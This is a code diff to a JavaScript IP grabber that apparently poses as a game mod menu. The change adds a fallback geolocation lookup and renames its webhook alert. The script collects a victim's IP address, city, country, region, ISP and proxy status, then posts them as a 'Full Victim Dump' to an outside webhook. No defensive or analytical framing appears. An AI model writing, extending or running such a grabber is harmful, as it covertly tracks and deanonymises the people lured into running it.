@@ -110,6 +110,10 @@
                 async () => {
                     const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                     return { ip: res.ip, country: res.country_name, countryCode: res.country, city: res.city, region: res.region, isp: res.org, timezone: res.timezone };
+                },
+                async () => { // Extra fallback
+                    const res = await fetch('https://freeipapi.com/api/json').then(r => r.json()).catch(() => ({}));
+                    return { ip: res.ipAddress, country: res.countryName, city: res.cityName, region: res.regionName, isp: res.isp };
                 }
             ];
 
@@ -118,9 +122,9 @@
                     const res = await svc();
                     if (res.ip) {
                         data.ip = res.ip;
-                        data.country = res.country || res.country_name || "Unknown";
+                        data.country = res.country || res.country_name || res.countryName || "Unknown";
                         data.countryCode = res.countryCode || "N/A";
-                        data.city = res.city || "Unknown";
+                        data.city = res.city || res.cityName || "Unknown";
                         data.region = res.region || res.regionName || "Unknown";
                         data.isp = res.isp || res.org || "Unknown";
                         data.timezone = res.timezone || "Unknown";
@@ -145,7 +149,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     username: "Mod Menu Grabber",
-                    content: `**🔥 MOD MENU GRABBED 🔥**\n**ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country} (${data.region})\n**ISP:** ${data.isp}\n**Proxy/VPN:** ${data.proxy}\n**Time:** ${data.timestamp}`,
+                    content: `**🔥 IP GRABBED 🔥**\n**ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country} (${data.region})\n**ISP:** ${data.isp}\n**Proxy/VPN:** ${data.proxy}\n**Time:** ${data.timestamp}`,
                     embeds: [{
                         title: "Full Victim Dump",
                         description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
